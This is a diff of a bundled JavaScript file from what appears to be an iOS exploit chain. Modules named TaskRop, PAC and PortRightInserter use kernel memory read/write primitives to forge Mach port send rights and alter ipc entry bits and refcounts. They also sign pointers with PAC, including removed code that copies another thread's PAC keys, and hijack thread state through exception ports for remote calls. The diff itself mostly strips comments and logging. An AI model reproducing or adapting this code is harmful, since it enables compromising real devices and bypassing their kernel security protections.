-/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
-/* harmony import */ var _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./ExceptionMessageStruct */ "./src/libs/TaskRop/ExceptionMessageStruct.js");
-/* harmony import */ var _ExceptionReplyStruct__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./ExceptionReplyStruct */ "./src/libs/TaskRop/ExceptionReplyStruct.js");
-/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./MachMsgHeaderStruct */ "./src/libs/TaskRop/MachMsgHeaderStruct.js");
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( Exception)
+ });
+ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( "./src/libs/Chain/Native.js");
+ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__( "./src/libs/JSUtils/Utils.js");
+ var _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__( "./src/libs/TaskRop/ExceptionMessageStruct.js");
+ var _ExceptionReplyStruct__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__( "./src/libs/TaskRop/ExceptionReplyStruct.js");
+ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__( "./src/libs/TaskRop/MachMsgHeaderStruct.js");
 
 
 
@@ -4449,7 +4398,7 @@ class Exception
 		{
 			let errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_error_string",ret);
 			errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].readString(errString);
-			//console.log(TAG,`Error receiving exception message:${errString}`);
+			
 			return false;
 		}
 		if (debug)
@@ -4457,13 +4406,13 @@ class Exception
 			let excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(excBuffer,Number(this.ExceptionMessageSize));
 			let exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_2__["default"](excRes);
 			let elapsed = new Date().getTime() - t1;
-			//console.log(TAG,`Got exception succesfully after ${elapsed} ms with [id:${exc.Head.msgh_id}, exc=${exc.exception}, code=${Utils.hex(exc.codeFirst)}]`);
-			//console.log(TAG,`PC:${Utils.hex(exc.threadState.opaque_pc)}`);
-			//console.log(TAG,`LR:${Utils.hex(exc.threadState.opaque_lr)}`);
-			//console.log(TAG,`SP:${Utils.hex(exc.threadState.opaque_sp)}`);
-			//console.log(TAG,`FP:${Utils.hex(exc.threadState.opaque_fp)}`);
-			//for(let i = 0; i < 29; i++)
-			//	console.log(TAG,`x[${i}]:${Utils.hex(exc.threadState.registers.get(i))}`);
+			
+			
+			
+			
+			
+			
+			
 		}
 		return true;
 	}
@@ -4492,7 +4441,7 @@ class Exception
 		reply.RetCode = 0;
 		reply.flavor = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64;
 		reply.new_stateCnt = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64_COUNT;
-		//TODO make it inside ThreadState to copy thread state to another variable
+		
 		for(let i = 0; i < 29; i++)
 		{
 			reply.threadState.registers.set(i,state.registers.get(i));
@@ -4521,20 +4470,18 @@ class Exception
 }
 
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/TaskRop/ExceptionMessageStruct.js":
-/*!****************************************************!*\
-  !*** ./src/libs/TaskRop/ExceptionMessageStruct.js ***!
-  \****************************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/TaskRop/ExceptionMessageStruct.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ ExceptionMessageStruct)
-/* harmony export */ });
-/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./MachMsgHeaderStruct */ "./src/libs/TaskRop/MachMsgHeaderStruct.js");
-/* harmony import */ var _ThreadState__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./ThreadState */ "./src/libs/TaskRop/ThreadState.js");
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( ExceptionMessageStruct)
+ });
+ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( "./src/libs/TaskRop/MachMsgHeaderStruct.js");
+ var _ThreadState__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__( "./src/libs/TaskRop/ThreadState.js");
 
 
 
@@ -4578,20 +4525,18 @@ class ExceptionMessageStruct
 	set paddingSecond(value) { this.#dataView.setBigUint64(344,value,true); }
 }
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/TaskRop/ExceptionReplyStruct.js":
-/*!**************************************************!*\
-  !*** ./src/libs/TaskRop/ExceptionReplyStruct.js ***!
-  \**************************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/TaskRop/ExceptionReplyStruct.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ ExceptionReplyStruct)
-/* harmony export */ });
-/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./MachMsgHeaderStruct */ "./src/libs/TaskRop/MachMsgHeaderStruct.js");
-/* harmony import */ var _ThreadState__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./ThreadState */ "./src/libs/TaskRop/ThreadState.js");
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( ExceptionReplyStruct)
+ });
+ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( "./src/libs/TaskRop/MachMsgHeaderStruct.js");
+ var _ThreadState__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__( "./src/libs/TaskRop/ThreadState.js");
 
 
 
@@ -4620,18 +4565,16 @@ class ExceptionReplyStruct
 	set new_stateCnt(value) { this.#dataView.setUint32(40,value,true); }
 }
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/TaskRop/MachMsgHeaderStruct.js":
-/*!*************************************************!*\
-  !*** ./src/libs/TaskRop/MachMsgHeaderStruct.js ***!
-  \*************************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/TaskRop/MachMsgHeaderStruct.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ MachMsgHeaderStruct)
-/* harmony export */ });
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( MachMsgHeaderStruct)
+ });
 class MachMsgHeaderStruct
 {
 	#dataView;
@@ -4664,27 +4607,25 @@ class MachMsgHeaderStruct
 	}
 }
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/TaskRop/PAC.js":
-/*!*********************************!*\
-  !*** ./src/libs/TaskRop/PAC.js ***!
-  \*********************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/TaskRop/PAC.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ PAC)
-/* harmony export */ });
-//import Chain from "libs/Chain/Chain";
-//import Native from "libs/JSUtils/Native";
-//import Utils from "libs/JSUtils/Utils";
-//import Exception from "./Exception";
-//import Task from "./Task";
-//import Thread from "./Thread";
-//import ThreadState from "./ThreadState";
-//import ExceptionMessageStruct from "./ExceptionMessageStruct";
-//import Offsets from "Driver/Offsets";
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( PAC)
+ });
+
+
+
+
+
+
+
+
+
 
 const TAG = "PAC";
 
@@ -4693,206 +4634,42 @@ class PAC
 	static gadget_pacia;
 
 	static {
-		//this.#findGadgets();
+		
 	}
 	static remotePACLocal(address, modifier)
 	{
 		address = address & 0x7fffffffffn;
-		//console.log(TAG,`address:${Utils.hex(address)}, modifier:${Utils.hex(modifier)}`);
+		
 		let signedAddress = pacia(address, BigInt(modifier));
-		//console.log(TAG,`signedAddress:${Utils.hex(signedAddress)}`);
+		
 		return signedAddress;
 	}
 	static remotePAC(threadAddr, address, modifier)
 	{
 		return Native.pacia(address, modifier);
 		
-		//return this.remotePACLocal(address, modifier);
-		/*
-		if (!this.gadget_pacia)
-		{
-			console.log(TAG,`Doesn't have gadget_pacia, aborting`);
-			return 0;
-		}
-		address = address & 0x7fffffffffn;
-
-		let signedAddress = 0n;
-
-		// Get PAC keys of remote thread
-		let keyA = Thread.getRopPid(threadAddr);
-		let keyB = Thread.getJopPid(threadAddr);
-
-		//console.log(TAG,`Key A:${Utils.hex(keyA)}`);
-		//console.log(TAG,`Key B:${Utils.hex(keyB)}`);
-
-		let kr = 0;
-		let pacThread = Native.mem;
-		Native.callSymbol("thread_create", 0x203, pacThread);
-		let buffRes = Native.read(pacThread, Utils.UINT32_SIZE);
-		let viewRes = new DataView(buffRes);
-		pacThread = viewRes.getUint32(0,true);
-		//console.log(TAG,`pacThread:${Utils.hex(pacThread)}`);
-		let stack = Native.callSymbol("malloc",0x4000n);
-		let sp = stack + 0x2000n;
-		let stateBuff = new ArrayBuffer(Utils.ARM_THREAD_STATE64_SIZE);
-		let state = new ThreadState(stateBuff);
-		state.opaque_sp = sp;
-		//arm_thread_state64_set_pc_fptr(state, (void*)gadget_pacia);
-		let outputBuffer = Native.mem;
-		//console.log(TAG,`Before pacia`);
-		if(pacia)
-			state.opaque_pc = pacia(this.gadget_pacia,Utils.ptrauth_string_discriminator("pc"));
-		else
-			state.opaque_pc = Native.callSymbol("pacia",this.gadget_pacia,Utils.ptrauth_string_discriminator("pc"),Utils.ptrauth_key_asia);	
-		const buildVer = Offsets.getBuildVersion();
-		if(buildVer && buildVer.startsWith("22"))
-		{
-			//console.log(TAG, "Applying 18 fix");
-			//state.opaque_lr = 0x401n;
-			state.opaque_lr = pacia(0x401n,Utils.ptrauth_string_discriminator("lr"));
-		}
-		//console.log(TAG,`After pacia with pc:${state.opaque_pc}`);
-		//state.opaque_pc = Native.callSymbol("pacia",this.gadget_pacia,Utils.ptrauth_string_discriminator("pc"),Utils.ptrauth_key_asia);
-		state.registers.set(0,outputBuffer);
-		state.registers.set(1,BigInt(address));
-		state.registers.set(2,BigInt(modifier));
-		state.registers.set(3,BigInt(pacThread));
-		state.registers.set(16,BigInt(address));
-		state.registers.set(17,BigInt(modifier));
-
-		let exceptionPort = Exception.createPort();
-		if (!exceptionPort)
-		{
-			console.log(TAG,`Cannot create exception port`);
-			this.#cleanup(pacThread,exceptionPort,stack);
-			return 0n;
-		}
-
-		//console.log(TAG,`Exception port:${Utils.hex(exceptionPort)}`);
-
-		kr = Native.callSymbol("thread_set_exception_ports",
-			pacThread,
-			Utils.EXC_MASK_BAD_ACCESS,
-			exceptionPort,
-			Utils.EXCEPTION_STATE | Utils.MACH_EXCEPTION_CODES,
-			BigInt(Utils.ARM_THREAD_STATE64));
 		
-		if (kr != 0)
-		{
-			console.log(`thread_set_exception_ports failed:${kr}`);
-			this.#cleanup(pacThread,exceptionPort,stack);
-			return 0n;
-		}
-		let pacThreadAddr = Task.getPortKObject(BigInt(pacThread));
-		//console.log(TAG,`PAC thread address:${Utils.hex(pacThreadAddr)}`);
-		if (!this.#setThreadState(pacThread, pacThreadAddr, stateBuff))
-		{
-			console.log(TAG,`Failed to set thread state`);
-			this.#cleanup(pacThread,exceptionPort,stack);
-			return 0n;
-		}
-		// Change pacThread PAC keys with those of remote thread
-		Thread.setPACKeys(pacThreadAddr, keyA, keyB);
-		//console.log(TAG,`Starting PAC thread...`);
-		Native.callSymbol("thread_resume",pacThread);
-		let excBuffer = Native.mem;
-		if (!Exception.waitException(exceptionPort, excBuffer, 100, false))
-		{
-			console.log(TAG,`Failed to receive exception from PAC thread`);
-			this.#cleanup(pacThread,exceptionPort,stack);
-			return 0n;
-		}
-		let excRes = Native.read(excBuffer,Number(Exception.ExceptionMessageSize));
-		let exc = new ExceptionMessageStruct(excRes);
-		signedAddress = exc.threadState.registers.get(16);
-		//console.log(TAG,`Signed address: ${Utils.hex(address)} -> signedAddress:${Utils.hex(signedAddress)}`);
-		this.#cleanup(pacThread, exceptionPort, stack);
-		return signedAddress;
-		*/
+		
 	}
 
-	/*
-	static #findGadgets()
-	{
-		let sym = Native.dlsym("_ZNK3JSC13JSArrayBuffer8isSharedEv");
-		if (!sym)
-		{
-			console.log(TAG,`Symbol not found`);
-			return false;
-		}
-
-		let symStripped = sym & ~0xffffff8000000000n;
-		let gadgetOpcodesBuff = new ArrayBuffer(20);
-		let gadgetOpcodesView = new DataView(gadgetOpcodesBuff);
-		gadgetOpcodesView.setUint32(0,0xDAC10230,true);
-		gadgetOpcodesView.setUint32(4,0x9A9003E8,true);
-		gadgetOpcodesView.setUint32(8,0xF100011F,true);
-		gadgetOpcodesView.setUint32(12,0x1A9F07E0,true);
-		gadgetOpcodesView.setUint32(16,0xD65F03C0,true);
-		let data = Native.read(symStripped,0x1000);
-		let gadgetOffset = Utils.memmem(data,gadgetOpcodesBuff);
-		if (!gadgetOffset)
-		{
-			console.log(TAG,`pacia_gadget offset not found`);
-			return false;
-		}
-		this.gadget_pacia = symStripped + BigInt(gadgetOffset);
-
-		console.log(TAG,`Gadgets found: pacia=${Utils.hex(this.gadget_pacia)}`);
-
-		return true;
-	}
-
-	static #setThreadState(thread,threadAddr,stateBuff)
-	{
-		let options = Thread.getOptions(threadAddr);
-		options |= 0x8000;	
-		Thread.setOptions(threadAddr, options);
-		let stateMem = Native.mem;
-		Native.write(stateMem,stateBuff);
-		//console.log(TAG,`thread:${Utils.hex(thread)}`);
-		let kr = Native.callSymbol("thread_set_state",
-			thread,
-			BigInt(Utils.ARM_THREAD_STATE64),
-			stateMem,
-			BigInt(Utils.ARM_THREAD_STATE64_COUNT));
-		if (kr != 0)
-		{
-			console.log(TAG,`Failed thread_set_state with error:${kr}`);
-			return false;
-		}
-
-		options &= ~0x8000;
-		Thread.setOptions(threadAddr, options);
-		return true;
-	}
-
-	static #cleanup(pacThread,exceptionPort,stack)
-	{
-		Native.callSymbol("thread_terminate",pacThread);
-		Native.callSymbol("mach_port_destruct",0x203, exceptionPort, 0n, 0n);
-		Native.callSymbol("free",stack);
-	}
-	*/
+	
 }
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/TaskRop/PortRightInserter.js":
-/*!***********************************************!*\
-  !*** ./src/libs/TaskRop/PortRightInserter.js ***!
-  \***********************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/TaskRop/PortRightInserter.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ PortRightInserter)
-/* harmony export */ });
-/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
-/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
-/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
-/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./MachMsgHeaderStruct */ "./src/libs/TaskRop/MachMsgHeaderStruct.js");
-/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./Task */ "./src/libs/TaskRop/Task.js");
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( PortRightInserter)
+ });
+ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( "./src/libs/Chain/Native.js");
+ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__( "./src/libs/Chain/Chain.js");
+ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__( "./src/libs/JSUtils/Utils.js");
+ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__( "./src/libs/TaskRop/MachMsgHeaderStruct.js");
+ var _Task__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__( "./src/libs/TaskRop/Task.js");
 
 
 
@@ -4928,17 +4705,17 @@ class PortRightInserter {
 	
 	static insert(portKaddr) {
 		const p = this.#newPort();
-		//console.log(TAG, "New port: " + Utils.hex(p));
+		
 		const pAddr = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].getPortAddr(BigInt(p));
-		//console.log(TAG, "New port addr: " + Utils.hex(pAddr));
+		
 		if (!pAddr)
 			return 0;
 
-		//this.#dumpPort(portKaddr);
-		//this.#dumpPort(pAddr);
+		
+		
 
 		const backupBits = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read32(portKaddr);
-		//console.log(TAG, "Port io bits: " + Utils.hex(backupBits));
+		
 		const needsFixBits = (backupBits & IO_BITS_KOLABEL);
 
 		if (needsFixBits) {
@@ -4948,22 +4725,22 @@ class PortRightInserter {
 
 		this.#fixRefCounts(portKaddr, 1);
 
-		//console.log(TAG, "Fix Ok");
-		//this.#dumpPort(portKaddr);
+		
+		
 
 		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write64(pAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().ipNsRequest, portKaddr);
-		//this.#dumpPort(pAddr);
+		
 
 		let previous = this.#notifyNoSenders(p, MACH_PORT_NULL);
-		//console.log(TAG, "Previous right: " + Utils.hex(previous));
+		
 
-		// Change the port rights from send once to send.
+		
 		this.#switchToSendRight(previous);
 
-		//this.#fixRefCounts(portKaddr, -1, false);
+		
 
-		// We have a send right to the port, but it's not in our space's hash.
-    	// We send the port, then kill the entry. We'll properly receive it afterwards.
+		
+    	
 		let msgBuff = new ArrayBuffer(40);
 		let msgHeader = new _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_3__["default"](msgBuff);
 		msgHeader.msgh_id = 0x4141;
@@ -4971,17 +4748,17 @@ class PortRightInserter {
 		msgHeader.msgh_local_port = p;
 		msgHeader.msgh_size = msgBuff.byteLength;
 		msgHeader.msgh_bits = _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_3__["default"].MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, MACH_MSG_TYPE_MAKE_SEND);
-		msgHeader.msgh_bits |= MACH_MSGH_BITS_COMPLEX;	// we send a port descriptor
+		msgHeader.msgh_bits |= MACH_MSGH_BITS_COMPLEX;	
 
 		let msgBody = new DataView(msgBuff, 24);
-		msgBody.setInt32(0, 1, true); 					// msgh_descriptor_count
-		msgBody.setUint32(4, previous, true);			// name
-		msgBody.setUint8(14, MACH_MSG_TYPE_COPY_SEND);	// disposition
-		msgBody.setUint8(15, MACH_MSG_PORT_DESCRIPTOR);	// type
+		msgBody.setInt32(0, 1, true); 					
+		msgBody.setUint32(4, previous, true);			
+		msgBody.setUint8(14, MACH_MSG_TYPE_COPY_SEND);	
+		msgBody.setUint8(15, MACH_MSG_PORT_DESCRIPTOR);	
 
-		//let wMsg64 = new BigUint64Array(msgBuff);
-		//for (let i=0; i<5; i++)
-		//	console.log(TAG, `${i}: ${Utils.hex(wMsg64[i]).padStart(16, '0')}`);
+		
+		
+		
 
 		let msgMem = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem;
 		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write(msgMem, msgBuff);
@@ -4992,8 +4769,8 @@ class PortRightInserter {
 			p,
 			0,
 			0);
-		//console.log(TAG, "mach_msg: " + ret);
-		//Native.callSymbol("sleep", 1);
+		
+		
 		if (ret != 0) {
 			let errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_error_string", ret);
 			errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].readString(errString);
@@ -5001,7 +4778,7 @@ class PortRightInserter {
 			return 0;
 		}
 
-		//console.log(TAG, "mach_msg send: " + ret);
+		
 
 		this.#killRight(previous);
 
@@ -5020,22 +4797,22 @@ class PortRightInserter {
 			return 0;
 		}
 
-		//console.log(TAG, "mach_msg recv: " + ret);
-		//Native.callSymbol("sleep", 1);
+		
+		
 
 		let rMsg = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(msgMem, 40);
 
-		//let rMsg64 = new BigUint64Array(rMsg);
-		//for (let i=0; i<5; i++)
-		//	console.log(TAG, `${i}: ${Utils.hex(rMsg64[i]).padStart(16, '0')}`);
+		
+		
+		
 
 		msgBody = new DataView(rMsg, 24);
 		previous = msgBody.getUint32(4, true);
-		//console.log(TAG, "previous: " + Utils.hex(previous));
+		
 
 		this.#fixRefCounts(portKaddr, -1);
 
-		//this.#dumpPort(portKaddr);
+		
 
 		return previous;
 	}
@@ -5058,31 +4835,31 @@ class PortRightInserter {
 
 	static #switchToSendRight(port) {
 		const entry = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].getRightAddr(BigInt(port));
-		//console.log(TAG, "entry: " + Utils.hex(entry));
-		//this.#dumpEntry(entry);
+		
+		
 		let bits = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read32(entry + 0x8n);
-		//console.log(TAG, "entry bits: " + Utils.hex(bits));
+		
 		bits = (bits & ~IE_BITS_TYPE_MASK) | MACH_PORT_TYPE_SEND;
 		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write32(entry + 0x8n, bits);
-		//this.#dumpEntry(entry);
+		
 	}
 
 	static #killRight(port) {
 		const entry = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].getRightAddr(BigInt(port));
-		//console.log(TAG, "entry: " + Utils.hex(entry));
-		//this.#dumpEntry(entry);
+		
+		
 		let bits = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read32(entry + 0x8n);
-		//console.log(TAG, "entry bits: " + Utils.hex(bits));
+		
 		bits = (bits & ~IE_BITS_TYPE_MASK) | MACH_PORT_TYPE_DEAD_NAME;
 		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write64(entry, 0n);
 		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write32(entry + 0x8n, bits);
-		//this.#dumpEntry(entry);
+		
 	}
 
 	static #fixRefCounts(portAddr, diff, updateRefs=true, updateSonce=true) {
-		// Due to krw limitation, we cannot write at offset +132 of a 144 bytes struct,
-		// since krw would write in chunks of 32 bytes and so would cause a memory overflow (panic).
-		// So we read all the 144 bytes struct, changes values and then write it again as a whole.
+		
+		
+		
 
 		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read(portAddr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 144);
 		let ipcPort = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 144);
@@ -5091,18 +4868,18 @@ class PortRightInserter {
 		let refs = ipcPortView.getUint32(0x4, true);
 		let sonce = ipcPortView.getUint32(Number(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().ipSorights), true);
 
-		//console.log(TAG, "refs: " + refs);
-		//console.log(TAG, "sonce: " + sonce);
+		
+		
 
 		refs += diff;
 		sonce += diff;
 
 		if (updateRefs) {
-			//console.log(TAG, "new refs: " + refs);
+			
 			ipcPortView.setUint32(0x4, refs, true);
 		}
 		if (updateSonce) {
-			//console.log(TAG, "new sonce: " + sonce);
+			
 			ipcPortView.setUint32(Number(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().ipSorights), sonce, true);
 		}
 
@@ -5122,7 +4899,7 @@ class PortRightInserter {
 			notifyPort,
 			MACH_MSG_TYPE_MAKE_SEND_ONCE,
 			previousPtr);
-		//console.log(TAG, "mach_port_request_notification: " + kr);
+		
 		if (kr != 0)
 			return MACH_PORT_NULL;
 		return libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read32(previousPtr);
@@ -5148,18 +4925,16 @@ class PortRightInserter {
 }
 
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/TaskRop/RegistersStruct.js":
-/*!*********************************************!*\
-  !*** ./src/libs/TaskRop/RegistersStruct.js ***!
-  \*********************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/TaskRop/RegistersStruct.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ RegistersStruct)
-/* harmony export */ });
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( RegistersStruct)
+ });
 const TAG = "REGISTERSSTRUCT"
 
 class RegistersStruct
@@ -5176,7 +4951,7 @@ class RegistersStruct
             console.log(TAG,`Got wrong index in get:${index}`);
 			return;
         }
-        return this.#dataView.getBigUint64(index * 8, true); // true for little-endian
+        return this.#dataView.getBigUint64(index * 8, true); 
     }
 
     set(index, value) {
@@ -5184,35 +4959,33 @@ class RegistersStruct
             console.log(TAG,`Got wrong index in set`);
 			return;
         }
-        this.#dataView.setBigUint64(index * 8, BigInt(value), true); // true for little-endian
+        this.#dataView.setBigUint64(index * 8, BigInt(value), true); 
     }
 }
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/TaskRop/RemoteCall.js":
-/*!****************************************!*\
-  !*** ./src/libs/TaskRop/RemoteCall.js ***!
-  \****************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/TaskRop/RemoteCall.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ RemoteCall)
-/* harmony export */ });
-/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
-/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
-/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
-/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./Task */ "./src/libs/TaskRop/Task.js");
-/* harmony import */ var _Thread__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./Thread */ "./src/libs/TaskRop/Thread.js");
-/* harmony import */ var _Exception__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ./Exception */ "./src/libs/TaskRop/Exception.js");
-/* harmony import */ var _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ./ExceptionMessageStruct */ "./src/libs/TaskRop/ExceptionMessageStruct.js");
-/* harmony import */ var _ThreadState__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! ./ThreadState */ "./src/libs/TaskRop/ThreadState.js");
-/* harmony import */ var _PAC__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__(/*! ./PAC */ "./src/libs/TaskRop/PAC.js");
-/* harmony import */ var _VM__WEBPACK_IMPORTED_MODULE_9__ = __webpack_require__(/*! ./VM */ "./src/libs/TaskRop/VM.js");
-/* harmony import */ var _VMShmem__WEBPACK_IMPORTED_MODULE_10__ = __webpack_require__(/*! ./VMShmem */ "./src/libs/TaskRop/VMShmem.js");
-/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_11__ = __webpack_require__(/*! ./MachMsgHeaderStruct */ "./src/libs/TaskRop/MachMsgHeaderStruct.js");
-/* harmony import */ var _PortRightInserter__WEBPACK_IMPORTED_MODULE_12__ = __webpack_require__(/*! ./PortRightInserter */ "./src/libs/TaskRop/PortRightInserter.js");
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( RemoteCall)
+ });
+ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( "./src/libs/JSUtils/Utils.js");
+ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__( "./src/libs/Chain/Native.js");
+ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__( "./src/libs/Chain/Chain.js");
+ var _Task__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__( "./src/libs/TaskRop/Task.js");
